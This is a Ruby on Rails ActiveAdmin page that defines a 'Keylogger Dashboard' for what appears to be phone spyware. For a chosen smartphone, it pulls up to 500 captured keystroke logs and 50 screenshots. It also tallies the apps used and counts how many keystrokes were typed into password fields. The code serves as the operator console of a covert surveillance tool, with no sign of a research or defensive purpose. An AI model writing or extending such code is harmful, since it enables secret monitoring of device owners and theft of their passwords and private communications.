ActiveAdmin.register_page "Keylogger" do
  menu priority: 5, label: proc { "🔑 Keylogger" }

  content title: "Keylogger Dashboard" do
    render partial: 'admin/keylogger/dashboard'
  end
  
  controller do
    def index
      @devices = Smartphone.all
      @selected_device = params[:device_id] || Smartphone.first&.name
      
      if @selected_device
        @keylogs = Keylog.where(device_id: @selected_device).recent.limit(500)
        @screenshots = KeylogScreenshot.where(device_id: @selected_device).recent.limit(50)
        @stats = {
          total_keystrokes: @keylogs.count,
          total_screenshots: @screenshots.count,
          apps_used: @keylogs.pluck(:app_package).uniq.compact,
          password_entries: @keylogs.where(input_type: 'password').count
        }
      end
    end
  end
end
